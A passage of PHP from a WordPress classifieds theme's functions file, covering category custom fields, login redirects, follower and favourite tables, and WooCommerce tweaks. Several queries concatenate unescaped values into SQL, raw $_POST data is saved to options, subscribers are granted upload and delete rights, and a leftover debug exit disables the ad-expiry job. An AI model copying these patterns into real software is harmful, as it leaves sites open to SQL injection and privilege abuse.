					echo '<option value="All" selected disabled>'.esc_html__('Select Category', 'classiera')."</option>";
			        foreach ( $parentcategories as $parentcategory ) {
			           
			        echo '<option value=' . $parentcategory->term_id . '>' . $parentcategory->name . '</option>';
			 
			                $parent_id = $parentcategory ->term_id;
			                $subcategories = get_categories(array ( 'child_of' => $parent_id, 'hide_empty' => false ) ) ;
			 
			            foreach ( $subcategories as $subcategory ) { 
			 
			                $args = array (
			                    'post-type'=> 'questions',
			                    'orderby'=> 'name',
			                    'order'=> 'ASC',
			                    'post_per_page'=> -1,
			                    'nopaging'=> 'true',
			                    'taxonomy_name'=> $subcategory->name
			                ); 
			                 
			                echo '<option value=' . $subcategory->term_id . '> - ' . $subcategory->name . '</option>';
			            
			            } 
			        }
			    } 
        ?>
        </select>
		<p>NOTE: <br/> Text fields will display as input type=text,<br/> Checkbox Will show as features and input type=checkbox,<br/> Dropdown will display as < select >, <br/>Add options for dropdown with comma sepration like  option1,option2,option3</p>
    </div>

    <div class="wrap">
      	<?php
        	$args = array(
        	  'hide_empty' => false,
			  'orderby' => 'name',
			  'order' => 'ASC'
			);

			$inum = 0;

			$categories = get_categories($args);
			  	foreach($categories as $category) {;

			  	$inum++;

          		$user_name = $category->name;
          		$user_id = $category->term_id; 


          		$tag_extra_fields = get_option(MY_CATEGORY_FIELDS);
				$wpcrown_category_custom_field_option = $tag_extra_fields[$user_id]['category_custom_fields'];
				$wpcrown_category_custom_field_type = $tag_extra_fields[$user_id]['category_custom_fields_type'];
          ?>

          <div id="author-<?php echo $user_id; ?>" class="wrap-content" <?php if($inum == 1) { ?>style="display: block;"<?php } else { ?>style="display: none;"<?php } ?>>

            <h4><?php esc_html_e('Add Custom Fields to: ', 'classiera') ?><?php echo $user_name; ?></h4>
	
            <div id="badge_criteria_<?php echo $user_id; ?>">
				<table class="maintable">
					<tr class="custcathead">
						<th class="eratd"><span class="text ingredient-title"><?php esc_html_e( 'Custom field title', 'classiera' ); ?></span></th>
						<th class="eratd2"><span class="text ingredient-title"><?php esc_html_e( 'Input Type:', 'classiera' ); ?></span></th>
						<th class="eratd3"></th>
						<th class="eratd4"><span class="text ingredient-title"><?php esc_html_e( 'Delete', 'classiera' ); ?></span></th>
					</tr>
				</table>
              <?php 
                for ($i = 0; $i < (count($wpcrown_category_custom_field_option)); $i++) {
					//echo $wpcrown_category_custom_field_option."shabir";
              ?>
				<div class="badge_item" id="<?php echo $i; ?>">
					<table class="maintable" >
						<tr>  
							<td class="eratd">
								<input type='text' id='wpcrown_category_custom_field_option_<?php echo $user_id ?>[<?php echo $i; ?>][0]' name='wpcrown_category_custom_field_option_<?php echo $user_id ?>[<?php echo $i; ?>][0]' value='<?php if (!empty($wpcrown_category_custom_field_option[$i][0])) echo $wpcrown_category_custom_field_option[$i][0]; ?>' class='badge_name' placeholder='Add Title for Field'>
							</td>
							<td class="eratd2">
								<input class='field_type_<?php echo $user_id; ?>' type="radio" name="wpcrown_category_custom_field_type_<?php echo $user_id ?>[<?php echo $i; ?>][1]"
									<?php if (!empty($wpcrown_category_custom_field_type[$i][1]) && $wpcrown_category_custom_field_type[$i][1] == "text") echo "checked";?>
									value="text" >Text Field<br />
									<input class='field_type_<?php echo $user_id; ?>' type="radio" name="wpcrown_category_custom_field_type_<?php echo $user_id ?>[<?php echo $i; ?>][1]"
									<?php if (!empty($wpcrown_category_custom_field_type[$i][1]) && $wpcrown_category_custom_field_type[$i][1] == "checkbox") echo "checked";?>
									value="checkbox">Checkbox<br />
									<input class='field_type_<?php echo $user_id; ?>' type="radio" name="wpcrown_category_custom_field_type_<?php echo $user_id ?>[<?php echo $i; ?>][1]"
									<?php if (!empty($wpcrown_category_custom_field_type[$i][1]) && $wpcrown_category_custom_field_type[$i][1] == "dropdown") echo "checked";?>
									value="dropdown">Dropdown<br />
							</td>
							<?php
									$none = 'style="display:none"';
									if (!empty($wpcrown_category_custom_field_type[$i][1]) && $wpcrown_category_custom_field_type[$i][1] == "dropdown"){ 
										$none = '';
									}
								?>
							<td class="eratd3">
								
									<input <?php echo $none; ?> type='text' id='option_<?php echo $user_id ?>' name="wpcrown_category_custom_field_type_<?php echo $user_id ?>[<?php echo $i; ?>][2]" value='<?php echo $wpcrown_category_custom_field_type[$i][2]; ?>' class='options_c options_c_<?php echo $user_id; ?>' placeholder="Add Options with Comma , separated Example: One,Two,Three">

							</td>
							<td class="eratd4">
								<button name="button_del_badge" type="button" class="button-secondary button_del_badge_<?php echo $user_id; ?>">Delete</button>
							</td>
						</tr>  
					</table>
				</div>
              
              <?php 
                }
              ?>
            </div>

            <div id="template_badge_criterion_<?php echo $user_id; ?>" style="display: none;">
              
				<div class="badge_item" id="999">
					<table class="maintable">
						<tr>  
							<td class="eratd">
							  <input type='text' id='' name='' value='' class='badge_name' placeholder='Add Title for Field'>
							</td>
							<td class="eratd2">
								<input checked="cheched" type="radio" name="" value="text" class='field_type field_type_<?php echo $user_id; ?>'>Text Field<br />
								<input type="radio" name="" value="checkbox" class='field_type field_type_<?php echo $user_id; ?>'>Checkbox<br />
								<input type="radio" name="" value="dropdown" class='field_type field_type_<?php echo $user_id; ?>'>Dropdown<br />
							</td>
							<td class="eratd3">
								 <input style="display:none"  type='text' id='option_<?php echo $user_id ?>' name='' value='' class='options_c options_c_<?php echo $user_id; ?>' placeholder="Add Options with Comma , separated Example: One,Two,Three">
							</td>
							<td class="eratd4">
								<button name="button_del_badge" type="button" class="button-secondary button_del_badge_<?php echo $user_id; ?>">Delete</button>
								 
							</td>
						</tr>
					</table>
				</div>
            </div>
			<table class="maintable">
				<tr class="custcathead">
					<th class="eratd"><span class="text ingredient-title"><?php esc_html_e( 'Custom field title', 'classiera' ); ?></span></th>
					<th class="eratd2"><span class="text ingredient-title"><?php esc_html_e( 'Input Type:', 'classiera' ); ?></span></th>
					<th class="eratd3"></th>
					<th class="eratd4"><span class="text ingredient-title"><?php esc_html_e( 'Delete', 'classiera' ); ?></span></th>
				</tr>
			</table>
            <fieldset class="input-full-width">
              <button type="button" name="submit_add_badge" id='submit_add_badge_<?php echo $user_id; ?>' value="add" class="button-secondary">Add new custom field</button>
            </fieldset>
            <span class="submit"><input name="save<?php echo $user_id; ?>" type="submit" class="button-primary" value="Save changes" /></span>

            <script>

              // Add Badge

              jQuery('#template_badge_criterion_<?php echo $user_id; ?>').hide();
              jQuery('#submit_add_badge_<?php echo $user_id; ?>').on('click', function() {    
                $newItem = jQuery('#template_badge_criterion_<?php echo $user_id; ?> .badge_item').clone().appendTo('#badge_criteria_<?php echo $user_id; ?>').show();
                if ($newItem.prev('.badge_item').size() == 1) {
                  var id = parseInt($newItem.prev('.badge_item').attr('id')) + 1;
                } else {
                  var id = 0; 
                }
                $newItem.attr('id', id);

                var nameText = 'wpcrown_category_custom_field_option_<?php echo $user_id; ?>[' + id + '][0]';
                $newItem.find('.badge_name').attr('id', nameText).attr('name', nameText);
				
				var nameText2 = 'wpcrown_category_custom_field_type_<?php echo $user_id; ?>[' + id + '][1]';
							$newItem.find('.field_type').attr('id', nameText2).attr('name', nameText2);
							
				var nameText3 = 'wpcrown_category_custom_field_type_<?php echo $user_id; ?>[' + id + '][2]';
							$newItem.find('.options_c').attr('name', nameText3);

                //event handler for newly created element
                jQuery('.button_del_badge_<?php echo $user_id; ?>').on('click', function () {
                  jQuery(this).closest('.badge_item').remove();
                });

              });
              
              // Delete Ingredient
              jQuery('.button_del_badge_<?php echo $user_id; ?>').on('click', function() {
                jQuery(this).closest('.badge_item').remove();
              });

				// Delete Ingredient
			   jQuery( document ).ready(function() {
					jQuery(document).on('click', '.field_type_<?php echo $user_id; ?>', function(e) {
					var val = jQuery(this).val();
						if(val == 'dropdown'){
							jQuery(this).parent().next('td').find('#option_<?php echo $user_id ?>').css('display','block');
						}else{
							jQuery(this).parent().next('td').find('#option_<?php echo $user_id ?>').css('display','none');
						}
					});
				});
            </script>
          </div>
      <?php } ?>
    </div>

  <input type="hidden" name="action" value="savecat" />
  </form>

  <?php
}

function classiera_the_titlesmall($before = '', $after = '', $echo = true, $length = false) { $title = get_the_title();

	if ( $length && is_numeric($length) ) {
		$title = substr( $title, 0, $length );
	}

	if ( strlen($title)> 0 ) {
		$title = apply_filters('classiera_the_titlesmall', $before . $title . $after, $before, $after);
		if ( $echo )
			echo $title;
		else
			return $title;
	}
}
add_action('template_redirect', 'classiera_add_scripts');
 
function classiera_add_scripts() {
    if (is_singular()) {
      add_thickbox(); 
    }
}
//Register tag cloud filter callback
add_filter('widget_tag_cloud_args', 'classiera_tag_widget_limit');
 
//Limit number of tags inside widget
function classiera_tag_widget_limit($args){
	global $redux_demo;
	 $tagsnumber= $redux_demo['tags_limit']; 
	//Check if taxonomy option inside widget is set to tags
	if(isset($args['taxonomy']) && $args['taxonomy'] == 'post_tag'){
	  $args['number'] = $tagsnumber; //Limit number of tags
	}	 
	return $args;
}

function classiera_get_attachment_id_from_src($image_src) {

    global $wpdb;
    $query = "SELECT ID FROM {$wpdb->posts} WHERE guid='$image_src'";
    $id = $wpdb->get_var($query);
    return $id;

}


function classiera_add_media_upload_scripts() {
    if ( is_admin() ) {
         return;
       }
    wp_enqueue_media();
}
add_action('wp_enqueue_scripts', 'classiera_add_media_upload_scripts');

function classiera_get_avatar_url($author_id, $size){
    $get_avatar = get_avatar( $author_id, $size );
	$matches = array();     
   preg_match('/(?<!_)src=([\'"])?(.*?)\\1/',$get_avatar, $matches);	
    return ( $matches[2] );
}

function classiera_allow_users_uploads(){
	$contributor = get_role('contributor');
	$contributor->add_cap('upload_files');
	$contributor->add_cap('delete_published_posts');
	
	$subscriber = get_role('subscriber');
	$subscriber->add_cap('upload_files');
	$subscriber->add_cap('delete_published_posts');

}
add_action('admin_init', 'classiera_allow_users_uploads');


if ( current_user_can('subscriber') || current_user_can('contributor') && !current_user_can('upload_files') ) {
    add_action('admin_init', 'classiera_allow_contributor_uploads');
}
function classiera_allow_contributor_uploads() {	
	$contributor = get_role('contributor');
	$contributor->add_cap('upload_files');
	
    $subscriber = get_role('subscriber');
    $subscriber->add_cap('upload_files');	
}


add_filter( 'posts_where', 'classiera_devplus_attachments_wpquery_where' );
function classiera_devplus_attachments_wpquery_where( $where ){
    global $current_user;
	if ( !current_user_can( 'administrator' ) ) {
		if( is_user_logged_in() ){
			// we spreken over een ingelogde user
			if( isset( $_POST['action'] ) ){
				// library query
				if( $_POST['action'] == 'query-attachments' ){
					$where .= ' AND post_author='.$current_user->data->ID;
				}
			}
		}
	}
    return $where;
}
add_action( 'wp', 'classiera_ad_expiry_schedule' );
/**
 * On an early action hook, check if the hook is scheduled - if not, schedule it.
 */
function classiera_ad_expiry_schedule() {
	if ( ! wp_next_scheduled( 'classiera_ad_expiry_event' ) ) {
		wp_schedule_event( time(), 'hourly', 'classiera_ad_expiry_event');
	}
}
add_action( 'classiera_ad_expiry_event', 'classiera_ad_expiry' );
/**
 * On the scheduled action hook, run a function.
 */
function classiera_ad_expiry() {
	global $wpdb;
	global $redux_demo;
	$classieraExpiry = $redux_demo['ad_expiry'];
	echo $classieraExpiry."shabir"; exit();
	$daystogo = '';
	if (!empty($redux_demo['ad_expiry'])){
		$daystogo = $redux_demo['ad_expiry'];	
		$sql =
		"UPDATE {$wpdb->posts}
		SET post_status = 'trash'
		WHERE (post_type = 'post' AND post_status = 'publish')
		AND DATEDIFF(NOW(), post_date) > %d";
		$wpdb->query($wpdb->prepare( $sql, $daystogo ));
	}
}

add_action( 'after_setup_theme', 'classiera_admin_featuredPlan' );
function classiera_admin_featuredPlan() {
	global $wpdb;
	$adminPlanSql = ("CREATE TABLE IF NOT EXISTS {$wpdb->prefix}classiera_plans(
		id int(11) NOT NULL AUTO_INCREMENT,
		product_id TEXT ,
		user_id TEXT NOT NULL ,
		plan_name TEXT NOT NULL ,
		price FLOAT UNSIGNED NOT NULL ,
		ads TEXT ,
		days TEXT NOT NULL ,
		date TEXT NOT NULL ,
		status TEXT NOT NULL ,
		used TEXT NOT NULL ,
		created INT( 4 ) UNSIGNED NOT NULL,
        PRIMARY KEY (id)
    ) ENGINE=InnoDB AUTO_INCREMENT=1;");
	$wpdb->query($adminPlanSql);
	
	$price_plan_information = array(
		'id' =>'',
		'product_id' => '',
		'user_id' => '1',
		'plan_name' => 'Unlimited Ads',
		'price' => '',
		'ads' => 'unlimited',
		'days' => 'unlimited',
		'status' => "complete",
		'used' => "0",
		'created' => time()
	);
	
	$insert_format = array('%d', '%d', '%d', '%s','%d', '%s', '%s', '%s', '%s', '%s');
	$tablename = $wpdb->prefix . 'classiera_plans';
	$result = $wpdb->get_results( "SELECT * FROM {$wpdb->prefix}classiera_plans WHERE user_id = 1 ORDER BY id DESC" );

	if (empty($result )){
		$wpdb->insert($tablename, $price_plan_information, $insert_format);
	}
}
function classiera_cubiq_login_init () {
    $action = isset($_REQUEST['action']) ? $_REQUEST['action'] : 'login';
	global $redux_demo;
	$login = $redux_demo['login'];	
	$reset = $redux_demo['reset'];	
    if ( isset( $_POST['wp-submit'] ) ) {
        $action = 'post-data';
    } else if ( isset( $_GET['reauth'] ) ) {
        $action = 'reauth';
    } else if ( isset($_GET['key']) ) {
        $action = 'resetpass-key';
    }

    // redirect to change password form
    if ( $action == 'rp' || $action == 'resetpass' ) {
        wp_redirect( $login.'/?action=resetpass' );
        exit;
    }
	
	// redirect to change password form
    if ( $action == 'register') {
        wp_redirect( $login.'/?action=resetpass' );
        exit;
    }

    // redirect from wrong key when resetting password
    if ( $action == 'lostpassword' && isset($_GET['error']) && ( $_GET['error'] == 'expiredkey' || $_GET['error'] == 'invalidkey' ) ) {
        wp_redirect($reset.'/?action=forgot&failed=wrongkey' );
        exit;
    }

    if (
        $action == 'post-data'        ||            // don't mess with POST requests
        $action == 'reauth'           ||            // need to reauthorize
        $action == 'resetpass-key'    ||            // password recovery
        $action == 'logout'           ||              // user is logging out
		$action == 'postpass'
    ) {
        return;
    }   
	wp_redirect($login);
    exit;
}
add_action('login_init', 'classiera_cubiq_login_init');

function classiera_cubiq_registration_redirect ($errors, $sanitized_user_login, $user_email) {
	global $redux_demo;
	$login = $redux_demo['login'];	
	$register = $redux_demo['register'];	
    // don't lose your time with spammers, redirect them to a success page
    if ( !isset($_POST['confirm_email']) || $_POST['confirm_email'] !== '' ) {

        wp_redirect($login. '?action=register&success=1' );
        exit;

    }

    if ( !empty( $errors->errors) ) {
        if ( isset( $errors->errors['username_exists'] ) ) {

            wp_redirect( $register . '?action=register&failed=username_exists' );

        } else if ( isset( $errors->errors['email_exists'] ) ) {

            wp_redirect( $register . '?action=register&failed=email_exists' );

        } else if ( isset( $errors->errors['empty_username'] ) || isset( $errors->errors['empty_email'] ) ) {

            wp_redirect($register . '?action=register&failed=empty' );

        } else if ( !empty( $errors->errors ) ) {

            wp_redirect( $register . '?action=register&failed=generic' );

        }

        exit;
    }

    return $errors;

}
add_filter('registration_errors', 'classiera_cubiq_registration_redirect', 10, 3);

/*-----------------------------------------------------------------------------------*/
/*	Infinite Pagination
/*-----------------------------------------------------------------------------------*/

if (!function_exists('infinite')){
	function infinite($query) {
		global $redux_demo;
		$classierabtnClass = 'btn btn-primary sharp btn-sm btn-style-one';
		$classieraBtnStyle = $redux_demo['classiera_cat_style'];
		if($classieraBtnStyle == 1){
			$classierabtnClass = 'btn btn-primary sharp btn-sm btn-style-one';
		}elseif($classieraBtnStyle == 2){
			$classierabtnClass = 'btn btn-primary round btn-md btn-style-two';
		}elseif($classieraBtnStyle == 3){
			$classierabtnClass = 'btn btn-primary radius btn-md btn-style-three';
		}elseif($classieraBtnStyle == 4){
			$classierabtnClass = 'btn btn-primary radius btn-md btn-style-four';
		}elseif($classieraBtnStyle == 5){
			$classierabtnClass = 'btn btn-primary outline btn-md btn-style-five';
		}elseif($classieraBtnStyle == 6){
			$classierabtnClass = 'btn btn-primary round outline btn-style-six';
		}elseif($classieraBtnStyle == 7){
			$classierabtnClass = 'btn btn-primary round outline btn-style-six';
		}else{
			$classierabtnClass = 'btn btn-primary sharp btn-sm btn-style-one';
		}
		
		$pages = intval($query->max_num_pages);
		$paged = (get_query_var('paged')) ? intval(get_query_var('paged')) : 1;
		if (empty($pages)) {
			$pages = 1;
		}
		if (1 != $pages) {
			echo '<p class="jw-pagination jw-infinite-scroll simple-pagination" data-has-next="' . ($paged === $pages ? 'false' : 'true') . '">';
			echo '<a class="'.$classierabtnClass.' no-more" href="#"><i class="fa fa-refresh"></i>' . esc_html_e('No more posts', 'classiera') . '</a>';
			echo '<a class="'.$classierabtnClass.' loading" href="#"><i class="fa fa-refresh"></i>' . esc_html_e('Loading posts ...', 'classiera') . '</a>';
			echo '<a class="'.$classierabtnClass.' next" href="' . get_pagenum_link($paged + 1) . '"><i class="fa fa-refresh"></i>' . esc_html_e('Load More ', 'classiera') . '</a>';
			echo '</p>';
			?>
			<div class="jw-pagination jw-infinite-scroll" data-has-next="<?php echo ($paged === $pages ? 'false' : 'true'); ?>">
				<div class="clearfix">					
				</div>				
				<div class="more-btn-main">
					<div class="view-more-separator"></div>
						<div class="view-more-btn">
						<div class="more-btn-inner text-center">
							<a class="next <?php echo $classierabtnClass; ?>" href="<?php echo get_pagenum_link($paged + 1);?>">
								<?php if($classieraBtnStyle == 1){?>
								<i class="icon-left fa fa-refresh"></i>
								<?php } ?>
								<?php esc_html_e( 'load more', 'classiera' ); ?>
								<?php if($classieraBtnStyle == 2){?>
								<span><i class="fa fa-refresh"></i></span>
								<?php } ?>
							</a>
							<a class="loading <?php echo $classierabtnClass; ?>">
								<?php if($classieraBtnStyle == 1){?>
								<i class="icon-left fa fa-refresh"></i>
								<?php } ?>
								<?php esc_html_e( 'Loading posts ...', 'classiera' ); ?>
								<?php if($classieraBtnStyle == 2){?>
								<span><i class="fa fa-refresh"></i></span>
								<?php } ?>
							</a>
							<a class="no-more <?php echo $classierabtnClass; ?>">
								<?php if($classieraBtnStyle == 1){?>
								<i class="icon-left fa fa-refresh"></i>
								<?php } ?>
								<?php esc_html_e( 'No more posts', 'classiera' ); ?>
								<?php if($classieraBtnStyle == 2){?>
								<span><i class="fa fa-refresh"></i></span>
								<?php } ?>
							</a>
						</div>
					</div>				
				</div>		
			</div>
			<?php 
		}
	}

}
/* set excerpt length for blog posts */

function classiera_blog_excerpt_length($length) {
	global $post;
	if ($post->post_type == 'blog_posts'){
		return 150;
	}
	else {
		return $length;
	}
}
add_filter('excerpt_length', 'classiera_blog_excerpt_length', 1000);	

/* Ajax Function */
add_action('wp_ajax_classiera_implement_ajax', 'classiera_implement_ajax');
add_action('wp_ajax_nopriv_classiera_implement_ajax', 'classiera_implement_ajax');//for users that are not logged in.
function classiera_implement_ajax(){		
	if(isset($_POST['mainCat'])){
		$mainCatSlug = $_POST['mainCat'];
		$mainCatIDSearch = get_category_by_slug($mainCatSlug);
		$mainCatID = $mainCatIDSearch->term_id;
		$cat_child = get_term_children($mainCatID, 'category' );
		if (!empty($cat_child)) {	
			$categories=  get_categories('child_of='.$mainCatID.'&hide_empty=0');
			  foreach ($categories as $cat) {				
				$option .= '<option value="'.$cat->slug.'">';
				$option .= $cat->cat_name;				
				$option .= '</option>';
			  }
			  echo '<option value="-1" selected="selected" disabled="disabled">'.esc_html__( "Select Sub Category..", "classiera" ).'</option>'.$option;
			die();
		}else{
			echo '<option value="-1" disabled="disabled">'.esc_html__( "No Sub Category Found", "classiera" ).'</option>';
		}
	} // end if
}

/*Start Classiera Favourite Function*/
function classiera_authors_tbl_create() {

    global $wpdb;

    $sql2 = ("CREATE TABLE IF NOT EXISTS {$wpdb->prefix}author_followers (

        id int(11) NOT NULL AUTO_INCREMENT,

        author_id int(11) NOT NULL,

        follower_id int(11) NOT NULL,

        PRIMARY KEY (id)

    ) ENGINE=InnoDB AUTO_INCREMENT=1;");

 $wpdb->query($sql2);

     $sql = ("CREATE TABLE IF NOT EXISTS {$wpdb->prefix}author_favorite (

        id int(11) NOT NULL AUTO_INCREMENT,

        author_id int(11) NOT NULL,

        post_id int(11) NOT NULL,

        PRIMARY KEY (id)

    ) ENGINE=InnoDB AUTO_INCREMENT=1;");

 $wpdb->query($sql);

}

add_action( 'init', 'classiera_authors_tbl_create', 1 );



function classiera_authors_insert($author_id, $follower_id) {

    global $wpdb;	

	$author_insert = ("INSERT into {$wpdb->prefix}author_followers (author_id,follower_id)value('".$author_id."','".$follower_id."')");

  $wpdb->query($author_insert);

}



function classiera_authors_unfollow($author_id, $follower_id) {

    global $wpdb;	

	$author_del = ("DELETE from {$wpdb->prefix}author_followers WHERE author_id = $author_id AND follower_id = $follower_id ");

  $wpdb->query($author_del);

}



function classiera_authors_follower_check($author_id, $follower_id) {

	global $wpdb;

	$results = $wpdb->get_results( "SELECT * FROM {$wpdb->prefix}author_followers WHERE follower_id = $follower_id AND author_id = $author_id", OBJECT );

    if(empty($results)){

		?>

		<form method="post" class="classiera_follow_user">

			<input type="hidden" name="author_id" value="<?php echo $author_id; ?>"/>

			<input type="hidden" name="follower_id" value="<?php echo $follower_id; ?>"/>

			<input type="submit" name="follower" value="<?php esc_html_e( 'Follow', 'classiera' ); ?>" />

		</form>

		<div class="clearfix"></div>

		<?php

	}else{

		?>

		<form method="post" class="classiera_follow_user">

			<input type="hidden" name="author_id" value="<?php echo $author_id; ?>"/>

			<input type="hidden" name="follower_id" value="<?php echo $follower_id; ?>"/>

			<input type="submit" name="unfollow" value="<?php esc_html_e( 'Unfollow', 'classiera' ); ?>" />

		</form>

		<div class="clearfix"></div>

		<?php

	}

}

function classiera_authors_all_follower($author_id){

	global $wpdb;

	$results = $wpdb->get_results( "SELECT * FROM {$wpdb->prefix}author_followers WHERE author_id = $author_id", OBJECT );

	$results2 = $wpdb->get_results( "SELECT * FROM {$wpdb->prefix}author_followers WHERE follower_id = $author_id", OBJECT );

	$followcounter = count($results);

	$followingcounter = count($results2);

	?>

	<div class="clearfix"></div>

	<div class="followers clearfix">

	<?php

	echo '<h1>Followers &nbsp;'.$followcounter.'</h1>';

	if(!empty($results)){

	$avatar = $results['0']->follower_id;

	echo '<div class="follower-avatar">';

	echo get_avatar($avatar, 70);

	echo '</div>';

	}

	?>

	</div>

	<div class="following">

	<?php

	echo '<h1>Following &nbsp;'.$followingcounter.'</h1>';

	if(!empty($results2)){

	$avatar = $results2['0']->author_id;

	echo '<div class="follower-avatar">';

	echo get_avatar($avatar, 70);

	echo '</div>';

	}

	?>

	</div>

	<?php

}

function classiera_favorite_insert($author_id, $post_id) {
	//echo "shabir".$author_id;
    global $wpdb;	

	$author_insert = ("INSERT into {$wpdb->prefix}author_favorite (author_id,post_id)value('".$author_id."','".$post_id."')");

  $wpdb->query($author_insert);

}



function classiera_authors_unfavorite($author_id, $post_id) {

    global $wpdb;	

	$author_del = ("DELETE from {$wpdb->prefix}author_favorite WHERE author_id = $author_id AND post_id = $post_id ");

  $wpdb->query($author_del);

}



function classiera_authors_favorite_check($author_id, $post_id) {

	global $wpdb;

	$results = $wpdb->get_results( "SELECT * FROM {$wpdb->prefix}author_favorite WHERE post_id = $post_id AND author_id = $author_id", OBJECT );

    if(empty($results)){
		?>
		<form method="post" class="fav-form clearfix">
			<input type="hidden" name="author_id" value="<?php echo $author_id; ?>"/>
			<input type="hidden" name="post_id" value="<?php echo $post_id; ?>"/>
			<button type="submit" value="favorite" name="favorite" class="watch-later text-uppercase"><i class="fa fa-heart-o"></i><?php esc_html_e( 'Watch Later', 'classiera' ); ?></button>
		</form>
		<?php

	}else{

		$all_fav = $wpdb->get_results("SELECT `post_id` FROM $wpdb->postmeta WHERE `meta_key` ='_wp_page_template' AND `meta_value` = 'template-favorite.php' ", ARRAY_A);

		$all_fav_permalink = get_permalink($all_fav[0]['post_id']);
		
		echo '<a class="fav" href="'.$all_fav_permalink.'"><i class="fa fa-heart unfavorite-i"></i> <span>'.esc_html__( 'Browse Favourites', 'classiera' ).'</span></a>';

	}

}

function classiera_authors_favorite_remove($author_id, $post_id) {

	global $wpdb;
	$results = $wpdb->get_results( "SELECT * FROM {$wpdb->prefix}author_favorite WHERE post_id = $post_id AND author_id = $author_id", OBJECT );
    if(!empty($results)){
		?>
		<form method="post" class="unfavorite">
			<input type="hidden" name="author_id" value="<?php echo $author_id; ?>"/>
			<input type="hidden" name="post_id" value="<?php echo $post_id; ?>"/>
			<div class="unfavorite">
				<button type="submit" name="unfavorite" class="btn btn-primary sharp btn-style-one btn-sm"><i class="icon-left fa fa-heart-o"></i><?php esc_html_e( 'unfavorite', 'classiera' ); ?></button>
			</div>
		</form>
		<?php
	}

}

function classiera_authors_all_favorite($author_id) {

	global $wpdb;
	$prepared_statement = $wpdb->prepare("SELECT post_id FROM {$wpdb->prefix}author_favorite WHERE  author_id = %d", $author_id);
	$postids = $wpdb->get_col($prepared_statement);
	//$postids = $wpdb->get_col( $wpdb->prepare( "SELECT post_id FROM {$wpdb->prefix}author_favorite WHERE author_id = $author_id", OBJECT ));
	
	foreach ($postids as $v2){
        $postids[] = $v2;
    }
		return $postids;
}
/*End Classiera Favourite Function*/
/*WooCommerece Functions Start*/

/*WooCommerece Rating Function */
add_action('woocommerce_after_shop_loop_item', 'classiera_get_star_rating' );
function classiera_get_star_rating()
{
    global $woocommerce, $product;
    $average = $product->get_average_rating();
	//echo $product->get_rating_html();
    echo '<div class="star-rating"><span style="width:'.( ( $average / 5 ) * 100 ) . '%"><strong itemprop="ratingValue" class="rating">'.$average.'</strong> '.esc_html_e( 'out of 5', 'classiera' ).'</span></div>';
}
/*WooCommerece great deal Function */
add_filter('woocommerce_sale_flash', 'classiera_custom_sale_flash', 10, 3);
function classiera_custom_sale_flash($text, $myPost) {
  return '<span class="great"> Great Deal </span>';   
}
/* Email Function End*/
/*Remove Notification from redux framework */
function classieraRemoveReduxDemoModeLink() { // Be sure to rename this function to something more unique
    if ( class_exists('ReduxFrameworkPlugin') ) {
        remove_filter( 'plugin_row_meta', array( ReduxFrameworkPlugin::get_instance(), 'plugin_metalinks'), null, 2 );
    }
    if ( class_exists('ReduxFrameworkPlugin') ) {
        remove_action('admin_notices', array( ReduxFrameworkPlugin::get_instance(), 'admin_notices' ) );    
    }
}
add_action('init', 'classieraRemoveReduxDemoModeLink');
/*Remove Notification from redux framework */

	/*Location with Images Start*/
	add_action( 'location_edit_form_fields', 'classiera_location_fields', 10, 2 );
	add_action( 'edited_location', 'classiera_save_location_fields', 10, 2 );
	
	// A callback function to save our extra taxonomy field(s)  
	function classiera_save_location_fields( $term_id ) {  
		if ( isset( $_POST['term_meta'] ) ) {  
			$t_id = $term_id;  
			$term_meta = get_option( "taxonomy_term_$t_id" );  
			$cat_keys = array_keys( $_POST['term_meta'] );  
				foreach ( $cat_keys as $key ){  
				if ( isset( $_POST['term_meta'][$key] ) ){  
					$term_meta[$key] = $_POST['term_meta'][$key];  
				}  
			}  
			//save the option array  
			update_option( "taxonomy_term_$t_id", $term_meta );  
		}  
	}


	function classiera_location_fields($tag) {  
	   // Check for existing taxonomy meta for the term you're editing  
		$t_id = $tag->term_id; // Get the ID of the term you're editing  
		$term_meta = get_option( "taxonomy_term_$t_id" ); // Do the check  
	?>  
	  
	<tr class="form-field">  
		<th scope="row" valign="top">  
			<label for="eralocation_id"><?php esc_html_e('Location Image', 'classiera'); ?></label>  
		</th>  
		<td>  
			<?php 

            

				if(!empty($term_meta)) {

                echo '<div style="width: 100%; float: left;"><img id="category_location_img" src="'. $term_meta['eralocation_id'] .'" style="float: left; margin-bottom: 20px;" /> </div>';
                echo '<input id="location_image" type="text" size="36" name="term_meta[eralocation_id]" style="max-width: 200px; float: left; margin-top: 10px; display: none;" value="'.$term_meta['eralocation_id'].'" />';
               
			   echo '<input id="location_image_button_remove" class="button" type="button" style="max-width: 140px; float: left; margin-top: 10px;" value="Remove" /> </br>';
                echo '<input id="location_image_button" class="button" type="button" style="max-width: 140px; float: left; margin-top: 10px; display: none;" value="Upload Image" /> </br>'; 

            } else {

               
                echo '<div style="width: 100%; float: left;"><img id="category_location_img" src="'. $term_meta['eralocation_id'] .'" style="float: left; margin-bottom: 20px;" /> </div>';
               echo '<input id="location_image" type="text" size="36" name="term_meta[eralocation_id]" style="max-width: 200px; float: left; margin-top: 10px; display: none;" value="'.$term_meta['eralocation_id'].'" />';
               
			   echo '<input id="location_image_button_remove" class="button" type="button" style="max-width: 140px; float: left; margin-top: 10px; display: none;" value="Remove" /> </br>';
                echo '<input id="location_image_button" class="button" type="button" style="max-width: 140px; float: left; margin-top: 10px;" value="Upload Image" /> </br>';

            }        

          

            ?> 
		</td>  
		 <script>
            var image_custom_uploader;
            jQuery('#location_image_button').click(function(e) {
                e.preventDefault();

                //If the uploader object has already been created, reopen the dialog
                if (image_custom_uploader) {
                    image_custom_uploader.open();
                    return;
                }

                //Extend the wp.media object
                image_custom_uploader = wp.media.frames.file_frame = wp.media({
                    title: 'Choose Image',
                    button: {
                        text: 'Choose Image'
                    },
                    multiple: false
                });

                //When a file is selected, grab the URL and set it as the text field's value
                image_custom_uploader.on('select', function() {
                    attachment = image_custom_uploader.state().get('selection').first().toJSON();
                    var url = '';
                    url = attachment['url'];
                    jQuery('#location_image').val(url);
                    jQuery( "img#category_location_img" ).attr({
                        src: url
                    });
                    jQuery("#location_image_button").css("display", "none");
                    jQuery("#location_image_button_remove").css("display", "block");
                });

                //Open the uploader dialog
                image_custom_uploader.open();
             });

             jQuery('#location_image_button_remove').click(function(e) {
                jQuery('#location_image').val('');
                jQuery( "img#category_location_img" ).attr({
                    src: ''
                });
                jQuery("#location_image_button").css("display", "block");
                jQuery("#location_image_button_remove").css("display", "none");
             });
            </script>
	</tr>  
	  
	<?php  
	} 
/* Location with Images end*/
?>
<?php
add_action('wp_head','classiera_ajaxURL');
function classiera_ajaxURL() { 
?>
